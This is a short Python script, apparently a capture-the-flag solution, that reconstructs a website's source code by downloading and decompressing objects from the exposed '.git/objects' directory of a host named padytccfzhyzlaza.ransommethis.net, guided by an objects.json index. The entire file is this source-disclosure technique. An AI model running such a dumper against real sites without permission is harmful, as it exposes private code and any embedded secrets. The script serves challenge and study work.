import json
import requests
import zlib
import os

# helper for downloading object and decompressing it
def download_git_object(path, sha):
	# make subfolders as needed
	path_parts = path.split('/')
	folder_path = 'src/' + '/'.join(path_parts[:-1])
	if not os.path.exists(folder_path):
		os.makedirs(folder_path)

	# download file
	folder = sha[:2]
	file = sha[2:]
	download_url = f"https://padytccfzhyzlaza.ransommethis.net/.git/objects/{folder}/{file}"
	compressed_file = requests.get(download_url).content
	
	# decompress file contents, remove header, and svae
	file_contents = zlib.decompress(compressed_file).decode('utf-8')
	file_start = file_contents.index('\x00') + 1
	with open(f"src/{path}", 'w') as fhand:
		fhand.write(file_contents[file_start:])

# download each object from index file
with open("objects.json", 'r') as fhand:
	objects = json.load(fhand)

for obj in objects:
	if "entry" in obj:
		download_git_object(obj["name"], obj["sha1"])